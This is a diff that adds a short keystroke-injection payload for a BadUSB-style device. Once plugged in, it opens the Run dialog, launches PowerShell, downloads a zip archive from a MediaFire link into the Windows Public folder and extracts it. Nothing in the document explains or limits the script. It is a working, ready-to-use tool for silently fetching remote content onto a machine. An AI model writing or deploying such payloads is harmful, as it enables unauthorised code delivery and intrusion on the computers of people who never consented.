@@ -1,0 +1,16 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 750
+
+STRING $URL = "https://download2271.mediafire.com/gtyskigrb1vgZuBiaaDsyQOtIvRNzBviQQIP9EYTSzMOOSHESHnO5xCVNRcASaJNF7m8kub9W2c62PVrW7PSsPKhaVJBIUHEb8UVsxM-kVa37La03ClBOVQaLYM8EemIe2mLg7ZNS8AaB6useWbfHHr3Lnn6NktTACDydg1VM2pTVS9O/p6ht2nfwxe0byxf/Community_Edition_3-1-004.zip"
+ENTER
+STRING $Path = "C:\Users\Public\melty.zip"
+ENTER
+STRING Invoke-Webrequest -URI $URL -Outfile $Path
+ENTER
+STRING Expand-Archive $Path
+ENTER
